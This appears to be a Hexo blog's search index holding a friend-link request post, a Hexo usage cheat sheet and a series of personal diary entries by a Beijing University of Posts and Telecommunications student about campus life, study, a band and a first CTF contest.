<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>来点朋友吧！互相学习一下！</title>
    <url>/2023/05/04/friendlink-apply/</url>
    <content><![CDATA[<p>请按照下列格式在评论区中回复信息（登录、未登录均可）</p>
<figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">站点名称：xxx</span><br><span class="line">地址：yyy</span><br><span class="line">描述：zzz</span><br><span class="line">图标：www（可选）</span><br><span class="line">是否一并申请主站(www.jason0743.space)友链：是/否</span><br></pre></td></tr></tbody></table></figure>
<p>经过验证后我会回复你的评论并将你的站点信息添加到本页面～前五名的申请者将可以获得侧栏展示机会！</p>
<div class="note warning"><p>如果要申请主站的友链，但是想使用不同的描述，请移步<a href="https://www.jason0743.space/#/friend-page-apply">主站表单页</a>进行相关信息的填写～</p>
</div>]]></content>
      <categories>
        <category>友情链接</category>
        <category>其他</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo 用法备忘录</title>
    <url>/2021/09/29/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>
<h2 id="Quick-Start">Quick Start</h2>
<h3 id="Create-a-new-post">Create a new post</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server">Run server</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></tbody></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files">Generate static files</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></tbody></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></tbody></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<h3 id="Tag-Plugins-Test">Tag Plugins Test</h3>
<h4 id="Centered-quotes">Centered quotes</h4>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{% centerquote %}</span><br><span class="line">content</span><br><span class="line">{% endcenterquote %}</span><br></pre></td></tr></tbody></table></figure>
<blockquote class="blockquote-center">
<p>content</p>

</blockquote>
<h4 id="Other-posts">Other posts</h4>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{% post_path filename %}</span><br><span class="line">{% post_link filename [title] [escape] %}</span><br></pre></td></tr></tbody></table></figure>
<a href="/2020/04/02/works/frontend/echarts-drawing/" title="使用echarts绘制2020疫情折线图">使用 echarts 绘制 2020 疫情折线图</a>
<h4 id="Admonition">Admonition</h4>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{% note info %}</span><br><span class="line">#### title</span><br><span class="line">content</span><br><span class="line">{% endnote %}</span><br><span class="line">	</span><br><span class="line">{% note warning title %}</span><br><span class="line">content</span><br><span class="line">{% endnote %}</span><br><span class="line">	</span><br><span class="line">{% note success %}</span><br><span class="line">#### Success Header</span><br><span class="line">**Welcome** to [Hexo!](https://hexo.io)</span><br><span class="line">{% endnote %}</span><br></pre></td></tr></tbody></table></figure>
<div class="note info"><h4 id="title">title</h4>
<p>content</p>
</div>
<details class="note warning"><summary><p>title</p>
</summary>
<p>content</p>

</details>
<div class="note success"><h4 id="Success-Header">Success Header</h4>
<p><strong>Welcome</strong> to <a href="https://hexo.io">Hexo!</a></p>
</div>
<h4 id="Content-Tabs">Content Tabs</h4>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{% tabs Unique name, [index] %}</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">{% endtabs %}</span><br></pre></td></tr></tbody></table></figure>
<div class="tabs" id="unique-name"><ul class="nav-tabs"><li class="tab"><a href="#unique-name-1"><i class="fa fa-heart"></i>first tab</a></li><li class="tab active"><a href="#unique-name-2">second tab</a></li><li class="tab"><a href="#unique-name-3">third tab</a></li></ul><div class="tab-content"><div class="tab-pane" id="unique-name-1"><p>first</p></div><div class="tab-pane active" id="unique-name-2"><p>second</p></div><div class="tab-pane" id="unique-name-3"><p><strong>This is Tab 3.</strong></p></div></div></div>
<h2 id="Video-and-audio-embeds">Video and audio embeds</h2>
<blockquote>
<p>Using <code>hexo-tag-mmedia</code> plugin, <a href="https://easyhexo.com/3-Plugins-use-and-config/3-5-hexo-tag-mmedia">https://easyhexo.com/3-Plugins-use-and-config/3-5-hexo-tag-mmedia</a></p>
</blockquote>
<h3 id="Bilibili">Bilibili</h3>
<figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">{% mmedia "bilibili" "bvid:&lt;bvid&gt;" "quality:high" "danmaku:true" "allowfullscreen" %}</span><br></pre></td></tr></tbody></table></figure>
<style>.bbplayer{width: 100%; max-width: 850px; margin: auto}</style><div class="bbplayer"><iframe class="bbplayer" id="mmedia-fdDAANjsoIohnyCw" src="https://player.bilibili.com/player.html?bvid=BV1yN4y1N7vZ&amp;page=1&amp;high_quality=1&amp;danmaku=true" allowfullscreen="allowfullscreen" scrolling="no" border="0" frameborder="0" framespacing="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups"></iframe></div><script> document.getElementById("mmedia-fdDAANjsoIohnyCw").style.height=document.getElementById("mmedia-fdDAANjsoIohnyCw").scrollWidth*0.76+"px";
    window.onresize = function(){
      document.getElementById("mmedia-fdDAANjsoIohnyCw").style.height=document.getElementById("mmedia-fdDAANjsoIohnyCw").scrollWidth*0.76+"px";
    }; </script>
<h3 id="西瓜视频">西瓜视频</h3>
<figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">{% mmedia "xigua" "xid=&lt;xid&gt;" %}</span><br></pre></td></tr></tbody></table></figure>
<style>.xgplayer{width: 100%; max-width: 850px; margin: auto}</style><div class="xgplayer"><iframe class="xgplayer" id="mmedia-KByAUhkmsyoijrTD" src="https://www.ixigua.com/iframe/7168109503483740711?autoplay=0&amp;startTime=undefined" allowfullscreen="allowfullscreen" scrolling="no" border="0" frameborder="0" framespacing="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups"></iframe></div><script> document.getElementById("mmedia-KByAUhkmsyoijrTD").style.height=document.getElementById("mmedia-KByAUhkmsyoijrTD").scrollWidth*0.7+"px";
    window.onresize = function(){
      document.getElementById("mmedia-KByAUhkmsyoijrTD").style.height=document.getElementById("mmedia-KByAUhkmsyoijrTD").scrollWidth*0.7+"px";
    }; </script>
<h3 id="MetingJS">MetingJS</h3>
<figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">{% mmedia "meting" &lt;id&gt; &lt;server&gt; &lt;type&gt; ... %}</span><br></pre></td></tr></tbody></table></figure>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/meting/2.0.1/Meting.min.js"></script><meting-js metin="meting" id="7737308430" server="netease" type="playlist"></meting-js> 
]]></content>
  </entry>
  <entry>
    <title>北邮小日记 —— 第一期</title>
    <url>/2017/10/11/diarys/bupt-1/</url>
    <content><![CDATA[<p>大家好，我是任子恒，好久不见，你们也有很长时间没有看到我在这个公众号上更新文字了。进北邮也有一个月了，一直忙于其他琐碎事情，没有来得及停一下，用文字记录下多彩的大学生活。</p>
<span id="more"></span>
<p>前几天，我偶尔看到与我同一宿舍的朋友在写 qq 空间上写日记，内容简单而质朴，反响不错，也勾起了我的写作欲望，恰好我有这么一个公众号，我就决定在这里写下去，记录下一段时间的心情和生活启示。这一系列文章暂时将被命名为【北邮小日记】，计算在我公众号的 “1000 文章计划” 中。我希望我可以记录下去，让这些文字成为我金色的记忆，在我人生的集邮册中留下举足轻重的一笔。</p>
<p>首先给我高中的同学解释一下我现在为什么在北邮（北京邮电大学），可能你们看了我 7 月发过的录取通知结果的截图后会比较奇怪，那不是显示北工大（北京工业大学）嘛？其实我是报的提前批 B 段，尝试了一波 “双培计划”，碰巧在这里就被录取了，要不然按我原来的填报，我的分是够北化工（北京化工大学）的，当然最后可能还会被北工大录取，这不是还得去嘛（呵呵）。“双培计划” 的好处就是可以享受到中央高校的优良教育资源，与只在原来那个学校读四年相比，有更好的体验，说白了就是在好一点的大学先学几年，然后再回去给同专业同学们传授（zhuang）经验（bi）嘛</p>
<p>北邮双培的话，是先在北邮 3 年，最后一年回北工大哦。另外，北邮第一学期一开始就军训了哦～</p>
<p>因此可以推断，这个系列的文章在第四年时就会改成【北工大小日记】了，当然名字不可能会这么简单。</p>
<p>之后才得知，好多同学都离我好近哦～希望可以经常面基</p>
<p>在这边，我的专业是信息安全，一个就业前景非常好的专业。我们除了要接受大学数学、英语等公共课程外，也会接触到信息保密、信息认证、密钥管理等专业涉及的知识。虽然还没有开始上专门的专业课，但概论课的学习已经开始了。这些课程同专业课一样重要，我要认真学习，天天向上～<br>
（你怎么不上天呢）</p>
<p>最高兴的莫过于选修课报上了桥牌课，几年来能正经学打牌的机会终于被我抓到了 (<sup>o</sup>)/（谁让中学没有机会报桥牌课→_→）每次上这个选修都可以在课上 “公然” 打牌，真是非常棒棒的～</p>
<p>现在已经 10 月了，按照我在中学时的进度，人早就认全了。但在这里，我还是名字和脸对不上，可能是平常不常见面的原因？看来以后我要疯狂刷存在感了… 做的其中一件事，就是不停地在我公众号上推送文章。</p>
<p>好了，写不动了，这期文字到此结束吧。我要去肛高数和线代了。ヽ (ﾟ∀ﾟ*)ﾉ</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2017/10/11/diarys/bupt-1/1.jpg" class="" width="250" height="250"></div><div class="group-picture-column"><img data-src="/2017/10/11/diarys/bupt-1/2.jpg" class="" width="250" height="250"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2017/10/11/diarys/bupt-1/3.jpg" class="" width="250" height="250"></div><div class="group-picture-column"><img data-src="/2017/10/11/diarys/bupt-1/4.jpg" class="" width="250" height="250"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2017/10/11/diarys/bupt-1/5.jpg" class="" width="250" height="250"></div><div class="group-picture-column"><img data-src="/2017/10/11/diarys/bupt-1/6.jpg" class="" width="250" height="250"></div></div></div>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十期</title>
    <url>/2018/05/22/diarys/bupt-10/</url>
    <content><![CDATA[<p>今天是 5 月 23 日，刚刚经历过连续两天的 “虐单身狗日”，表面上内心毫无波动，实际上内心也毫无波动，毕竟我整天都能看见情侣牵手从路上走过，简直太习惯了…… 不过，找女朋友这事还是迟早的……</p>
<p>5.20 那天晚上正好闲得无聊，去看了动漫社的晚会，欣赏宅舞 + 翻唱，<s>顺便看看漂亮小姐姐</s>。不过给我印象最深的是那个手书视频，真的十分精彩，画工和视频的转场非常棒，脚本很正能量很温暖，我<sub>一度想学一波</sub>，不过工作量是显而易见的。</p>
<p>为宅舞打 call 的粉丝真是十分专业了）</p>
<p>舞台剧真是太精彩了，玩梗真的太熟练了（<sub>原动画都没看过的我感觉什么都很厉害</sub>）</p>
<p>现场奖品还蛮丰富，内容也很有趣（有抱枕啊！我一直都想要一个！），当然非洲的我现场抽奖没能中……</p>
<p>之所以一个多月都没有再写东西，是因为一直在进行期中考试，我的高数、英语还行，其他科目也还看得过去，这个学期的课程可以明显感受到不容易了，有时上课稍微一溜号，一大部分内容就过去了，根本没反应过来（顺便吐槽下进度极快的大学物理 —— 一学期过完 “高中物理” 的节奏？我是说高中物理的内容 + 大学微积分思想），更不要想在课上睡一觉了：因为基本上没什么值得 “忽略” 听的内容。</p>
<p>当然，也打算在保证现在学习的同时，抢跑一些别的内容了。</p>
<p>（最近 python 学习计划，Start！）</p>
<p>一个月不打球了，手都要生了……</p>
<p>好多乱七八糟的事要上来了……</p>
<p>乐队视频暂时还是咕咕咕状态，因为没时间 + 素材不够，真的没骗你。最近接了几个校外 + 校内表演，还是十分期待的ヾ (Ő∀Ő๑)ﾉ，顺便趁机补一波素材 + 看看校外的小姐姐～</p>
<p>当然很荣幸可以作为乐队里最菜的键盘手，那个因 Cubase 装不上而一直编不了歌的非 (hai) 酋 (bao) 小哥哥来参与演出。啊，想想就激动ヽ (ﾟ∀ﾟ*)ﾉ━━━ｩ♪</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十一期</title>
    <url>/2018/06/06/diarys/bupt-11/</url>
    <content><![CDATA[<p>2018.6.6</p>
<p>今天是 6 月 6 日，恍然间，离高考已经过了一年时间。想必一年前的自己，为了考到一个好大学，为自己想做的工作铺平道路，忙到了焦头烂额吧。</p>
<span id="more"></span>
<p>将写下这篇文章的时间向前推一年，再过 9 个小时以后，就会面临第一科，语文考试，而此时我可能正在过一些课文默写，或者是看一看阅读答题技巧、作文素材…… 一大本 “五三” 不停地翻着，一张张一模、二模卷子也不停翻过…… 那时，我记得我曾经为糟糕的一模、二模发挥而焦急过，对于一些明明可以拿到更高分的题目，临做题时却总是手抖；再加上自主招生也没有通过，就更加着急了。在短时间的复习任务结束后，我大概是听着钢琴纯音来放松的。</p>
<p>至于最后一晚是怎么度过的，就记不太清楚了，大概是简单撩了一眼第二天要考的语文和数学的重难点，然后就上床睡觉了，大概比平常早了有 1-2 个小时吧……</p>
<p>之后两天就是考场和家两点一线，来回四次。随着一科科考试结束，“请各位考生坐好，准备交卷” 之后，便感觉放下了一大重担。高中生活就此终结，等知道分数以后，就将迎来新的人生历程 —— 大学。</p>
<p>当然考完之后，还参与了一下作文题的 “吐槽”。不过对于写作文的 “当事人” 来说，感受总归是最深的。</p>
<p>2018 年高考将在明天开始，到时候，将会出现新一轮高考题吐槽话题，而我们大可看个热闹，讨论一番。虽然不参与高考，但是作为曾经经历过高考，并且感觉尚未消失的人，还是感同身受的。假如要给学弟学妹们一些鼓励的话，或许现在的大一学生们就是最好的人选。</p>
<p>那么，现在我也想说一句：</p>
<blockquote class="blockquote-center">
<p>学弟学妹们，看到这篇文章时，你有可能还没有睡觉，也有可能已经考完若干科。无论什么时候，都不要紧张，发挥出自己的实力，将自己的努力转化为回报，给自己高中三年的学习画上一个完美的句号。</p>
<p>在考场上，你们就是出场自带 bgm 的人。</p>
<p>加油，我在北邮等你。</p>

</blockquote>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/06/06/diarys/bupt-11/1.jpg" class=""></div><div class="group-picture-column"><img data-src="/2018/06/06/diarys/bupt-11/2.jpg" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/06/06/diarys/bupt-11/3.jpg" class=""></div><div class="group-picture-column"><img data-src="/2018/06/06/diarys/bupt-11/4.jpg" class=""></div></div></div>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十二期</title>
    <url>/2018/09/01/diarys/bupt-12/</url>
    <content><![CDATA[<p>Yeah~ 我回来了！</p>
<p>暑假结束了，这个系列终于可以重新开启啦！</p>
<span id="more"></span>
<p>我一个暑假没怎么动过公众号，尽量不要掉粉啊…</p>
<p>（分明是你偷懒不想写）</p>
<p>从现在开始，就会有不时的流水账打扰你们的朋友圈了～</p>
<p>不废话，我们直切这次的主题 —— 迎新。</p>
<p>在开学前几天，学院的迎新报名通知一出现，我就赶紧把表填上了，毕竟可以趁机看看可爱的学弟学妹们，也是为数不多的可以蹭志愿时长的活动（笑）。当然，我被选中了，做了半天的接车工作。</p>
<p>8 月 31 日当天，我们 6：30 就到位了，已经有一些新生在迎新棚附近了，不过网安院的新生还没有到来。</p>
<p>等了大概有三四十分钟，随着几辆面包车的到来，一大波新生来了，我们手举 “网络空间安全学院” 的牌子，用大嗓门聚集本学院的新生。终于，我们接到了第一位新生，由其中一位接车处的同学带到了迎新棚，那里有我们的同事在等候。至于分配给我们的几辆手推车，都用来帮学弟学妹们搬运行李用了，最多的时候足足有四辆 (<em><sup>__</sup></em>)。</p>
<p>大嗓门喊人真的很容易嗓子干，当天又是大太阳天，极晒，我不知道领了有多少瓶水 (。⌒∇⌒)。</p>
<p>我也接了不少人，把学弟学妹往迎新棚带的时候，为了避免尴尬，途中找了点话聊。学弟学妹们一路赶来，想必很累吧，不过聊天还是很开心的～事后我统计了一下，我接了有 2-3 个北京的学弟学妹吧ヾ (･ω･`｡)（而且都是城郊的）。外地的基本上也是刚到北京，还没怎么玩，看来开学以后要多多带他们玩，增进一些关系了（笑）。上午的工作大概在 12：30 结束了，我们大概接到了 60 多人吧… 而与此同时，网安院的报道人数也过了 100 人（具体人数不清楚，我全程没有进报到处看（捂脸）），进度也是相当的快啊…… 后来得知在下午 2：30 时只剩约 10 人没到了……</p>
<p>中午（和晚上）的工作餐不错，十分好评～</p>
<p>下午我在宿舍睡了一觉，起来后得知网安院只剩 2 人没到了，遂赶紧下去帮忙。马路边上接车的人已经不是很多了，我赶到我们学院的接车点，发现仍然有很多人，就去迎新棚划水，那时大约是下午五点多了。最后，所有在场的志愿者来了一拨合影，记录下了这个一起工作的时刻。</p>
<p>晚上八点左右，我偷偷溜进了新生大会教室，在那里看到了新生群里经常活跃的学弟学妹们的 “真身”，嘿嘿嘿，尤其是看到了整天被爆照的那个哥们儿的真人，真的是帅如其人～（他还被邀上去讲话了 2333）</p>
<p>至于新生里的一些大佬，早在新生群里就非常熟悉了，没想到在现场也看到了～</p>
<p>最后我们给这些 18 级新生拍了张大合影～</p>
<p>最后一位同学，在晚上 8：44 时终于到来，给整天的工作画上一个圆满的句号！</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/09/01/diarys/bupt-12/1.jpg" class=""></div><div class="group-picture-column"><img data-src="/2018/09/01/diarys/bupt-12/2.jpg" class=""></div><div class="group-picture-column"><img data-src="/2018/09/01/diarys/bupt-12/3.jpg" class=""></div></div></div>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十三期</title>
    <url>/2018/11/07/diarys/bupt-13/</url>
    <content><![CDATA[<p>距离本学期的第一篇小日记已经过去了两个月，然而这两个月内我除了发笔记以外就没有什么别的干货… 果然还是懒 Orz</p>
<p>临近四六级考试了，可能会计划写点东西的，←算是干货预告</p>
<span id="more"></span>
<p>不过这个正在写文章的家伙打算这学期再来一次六级↑</p>
<p>到现在为止，我感觉这学期的课程压力更加大了，课后要进一步搞懂的东西多了不少。除了英语选修之外，哪一科都多少有点问题，脑袋卡壳一下再回复都会跟不上内容，更不要说突然内急上个厕所了。这学期的数字逻辑动手实验课也有些吃力，主要是因为手中材料和老师 ppt 要求不太一样，加上操作设备略复杂、不太熟练，课上根本做不完规定内容。对于我个人来说，还是要加油跟的。身体锻炼也不能少掉～</p>
<p>（有没有小伙伴们约跑步和乒乓球啊 qwq）</p>
<p>本学期的评优也结束了，结果对于我自己并不意外，但是突然的一项 “挂科即不能参评” 的规定让很多人失去了评奖学金的机会，尤其是我所在班级的人，实在可惜。我了解到了一些有关 “本科增负” 的一些报道，也认为这可能促成了这个 “挂科不参评” 的规定，感觉有些过于快了，有草率之嫌（去年有没有，我不得而知，从导员的反应看多半是没有）。从另一方面来说，这对于不挂科的人来说相当赚，但只以 “不挂科” 为目标似乎也太…… 苟了</p>
<p>感觉…… 也没得可写了？好吧，先写到这里。</p>
<p>去与离散数学愉快玩 (xue) 耍 (xi) 去了～</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十四期</title>
    <url>/2018/11/22/diarys/bupt-14/</url>
    <content><![CDATA[<p>查看今天的日历，恰好到达了东方的小雪节气和西方的感恩节。</p>
<p>也正好到了我爸爸的生日。</p>
<p>在这里跟我爸说一声生日快乐！</p>
<span id="more"></span>
<p>顺便也感谢下爸爸妈妈对我这几年来的培养。几年下来，他们为我指明了成长的方向，让我明白什么最重要，应该做些什么，为什么该这么做。现在，我也找到了自己的目标和最优的 lifestyle，踏实的继续向前进步。</p>
<p>这一年来，还应感谢各位班里和院里的同学，让我感受到大学生活的多彩，使我又扩展了很多好友面。乐队的成立是一个很重要的契机，因为它聚集了来自不同院系的不同志同道合的人。我们通过去年年末的 “巡回演出” 也涨了不少人气，今年仍将继续……</p>
<p>最后感谢自己，在各种激烈的碰撞中，能够找到细微的平衡点，既有 “通用的共同点” 可供打成一片，又不至于被 “过于同化”。</p>
<p>随笔之感，就写到这里。</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十五期</title>
    <url>/2018/12/19/diarys/bupt-15/</url>
    <content><![CDATA[<h2 id="SP篇——游园会">SP 篇 —— 游园会</h2>
<p>SP START</p>
<p>玩回来了！开写！</p>
<span id="more"></span>
<p>今天游园会啊！虽然之前零散地看过几篇推送，但是也没想到这么快就到啊<sub>同学叫我下去的时候，我还在肝手上的一个视频，五点多才反应过来要下去…… 天色已经黑下来了，路灯也都亮了，不顾手冷，赶紧先到处逛了逛。沙河这边虽然小，但是活动还是不少的嘛，二维码广场中央是表演，四周密密麻麻地布置了三十多个社团，有好多社团有小游戏玩呢</sub>当然还可以蹭蹭奖票……</p>
<p>果然有不少小游戏很好玩的社团，我先去 “本家” 社团转了几圈：在桥牌社数了大牌点，但是第二关算 24 点憾负于对手，拿到了 1（或者是 2？）张票和零食；在天枢 x 微软社团联动活动中体验了控制 5 秒和躲障碍小游戏，都成功拿到了小奖品，特别是控制 5 秒的那个，运气爆棚，在连续几次超过 0.2s 的误差后第一次 “入线” 就控到了 5 秒整，躲障碍第一次玩就是差 30 分破纪录；至于檐枫动漫社，我在那里体验了 osu！和 “记对子”（12 张牌扣在桌面上，每次拿 2 张，如非一对就扣回去，应该这么叫吧）；感觉数独社的进阶数独小有难度，一开始卡了一小下，虽然后面直追也没能在限定时间内完成，只拿到了完成奖。剩下的社团是挑着逛完的，也玩了一堆游戏。感觉遗憾就是没有去逛汉服社和民乐社，听说那两个社团的小游戏贼简单……</p>
<p>手上拿着二十张左右的票，时间也差不多到七点了，正思考着换点什么、吃点什么。我在路上走着，正好碰到了熟人，于是晚饭解决了。不过这 “换点什么”…… 时间太晚了，奖品基本上都没了，只好换了一个暖手宝。</p>
<p>我好想要那个 30 票的大熊抱枕 wwww</p>
<p>好了接下来放图</p>
<img data-src="/2018/12/19/diarys/bupt-15/1.jpg" class="" width="250" height="250">
<img data-src="/2018/12/19/diarys/bupt-15/2.jpg" class="" width="250" height="250">
<p>除了这些什么别的都没照</p>
<p>SP END</p>
<p>去年没写的游园会今年算是补回来了。我这个人啊啥时候咕过（划掉）</p>
<p>Warning：扎心了，还有一个月就期末考了</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
        <tag>special</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十六期</title>
    <url>/2018/12/31/diarys/bupt-16/</url>
    <content><![CDATA[<h2 id="18-19跨年大总结">18-19 跨年大总结</h2>
<p>START</p>
<p>光阴似箭，日月如梭，又是一年过去了，马上将要到达 2019 年了，“小日记” 系列也迎来了第十六期。我的关注者们想必也看了不少次我写的流水账了。</p>
<span id="more"></span>
<p>我的文章并不吸引人，实际上，自从我写完高考作文后，我就没有怎么写过十分 “富有条理” 且 “语言优美” 的文章，既没讲过什么有用的道理，也没有发挥专业知识论述过什么东西（更没往公众号上放过）。从来不以文笔见长的我蛮羡慕那些写得一篇好文章的人的，这样可以吸引一部分公众号的读者，就像博客和微博一样。还有几个高中同学也建立了自己的个人微信公众号，不时发布一些个人感悟相关的文章，写的都很深刻。整天放点干货诚然好，但是我也应该扩大一些涉及的范围嘛！</p>
<p>那难缠的审核机制另说……</p>
<p>回到学校生活上，这一年陆续经历了不少动手实验，从大一下的大物实验到大二上的数字逻辑系统实验，考验了一波动手能力和实验分析能力，报告也是手写的，没有格式提示，有些费力。偶尔碰上个难缠的实验，仪器很难操作的那种，就需要叫老师来协助，然后经提示一点一点做完。如果当天没做完，就还得需要额外半天时间补做，搞完实验数据。不过还好做完了～</p>
<p>需要写论文的课程也加上来了，大一下就遇见了两个，信息安全心理学和选修的经济管理，总字数也上万了，多亏了高中开过的科学研究方法课，这次写综述查论文就很轻车熟路了，学校的数据库也相当给力，让我查到了很多外文文献，获得了很多信息，也了解了很多最新的研究成果。查阅文献和写成论文的过程对于我来说，也是一次很好的学习。</p>
<p>我的笔记依然还在推送，大一下同步更新了《高数（下）》和《大学物理》，大二上同步更新了《数字逻辑》和《离散数学》，方便别人，也方便了自己～</p>
<p>今年又接触了两种编程语言，上半个学期的 java 和现在的 python，感觉自己继续在向 “技术型” 迈进。信安认知实习让我认识到了 SQL 注入、XSS 攻击等网络安全攻防方面的知识，当我自己在实验网站上实现成功时，也有不少成就感。学习到了相关知识后，我对这些攻防方法有了更多认识，并思考如何防御及利用。在最近写的数据库大作业中，我有意将 “防止注入” 做成了一个重要的安全 feature。</p>
<p>自己也开始关注一些 CTF 比赛，在班里拉了一个小队，准备进发各种比赛。12 月初，我们参加了南邮举办的 NCTF 线上赛，即使初次参加比赛，没什么经验，做不出几道题，工具的使用也不太熟练，但是在尝试运用自己所学解决问题的过程中，也获益无穷。明年，比赛仍然要继续打。</p>
<p>今年技术部的工作可以值得说说，因为我的工作遍及了图片、视频、场控三个方面。视频方面就是延续大一上的工作，继续往下做一做开场、暖场，套一套模板，也就那些；涉及图片方面的工作大概就是大二上开学时帮着弄的学长们的作品展示海报，虽然没采用上，但也锻炼了一下 PS 的使用；场控方面就是微信墙了，今年下半年有两个大活动，一个是 “网逅余声” 歌手大赛，还有一个是元旦晚会，我承担了两个活动的微信墙组建工作，都因为现场气氛太热烈而断过网 -_- 当然，看到参与者们这么积极的发信息互动，我也是很高兴的，但是直播现场断片也是一个不小的意外。这使我回想起高中的成人礼活动，当时的我在面对场控工作时，还有些慌手慌脚的，我的旁边还坐着老师；现在我的旁边是同级的同学们，偶尔会有学弟学妹来观摩工作，熟悉了一些工作套路后，便不再那么慌了。</p>
<p>顺便技术部 17 级也有两个人脱单了…… 什么时候我才能赶上脱单的末班车呢？虽说这一届技术部妹子比例很高ヾ (･ω･`｡)</p>
<p>乐队方面。今年初，我买到了我的键盘，从而打破了” 乐队演出需要借别人的琴” 的尴尬（上个学期那个琴也被原来的人拿走了）。总体来说是个血赚的投资。因为我挑选的是个编曲键盘，即使以后乐队不怎么演出了，也可以搬回宿舍编编曲，而且买琴时还附送了 cubase 软件，我的电脑上也装好了 FL Studio，我本人也几乎处于看看教程就可以开始摆弄音乐的状态。啊～真的好想马上写出来一首歌呢。</p>
<p>除了平常固定在学活排练外，我们还到外面借过小排练室去练过…</p>
<p>暑假，乐队的小伙伴们一起去了青岛，玩得开心且愉快。在那边住的时候，还即兴用两个和弦编过一个简单的段落，音色配合还不错，不知道小伙伴们还记不记得呢？</p>
<p>当然说到第一首原创曲目，就是在今年元旦晚会上表演的那首 see 了，以后的文章中可能还会说一说这首歌的。</p>
<p>寒假打算动一动工，开始第二首曲目的创作，但能否演出是个未知数，毕竟小伙伴们越来越忙了……（当然我作曲的原因是因为 “乐队的键盘手通常完成编曲工作（？）”，主音吉他手如是说道。）</p>
<p>当然最激动的事情莫过于今年的评优了，我或成最大赢家（？）</p>
<p>明年仍然要加油鸭～</p>
<p>就写到这里吧～</p>
<p>END</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
        <tag>special</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十七期</title>
    <url>/2019/04/02/diarys/bupt-17/</url>
    <content><![CDATA[<h2 id="久违的生日篇（1999-2019）">久违的生日篇（1999-2019）</h2>
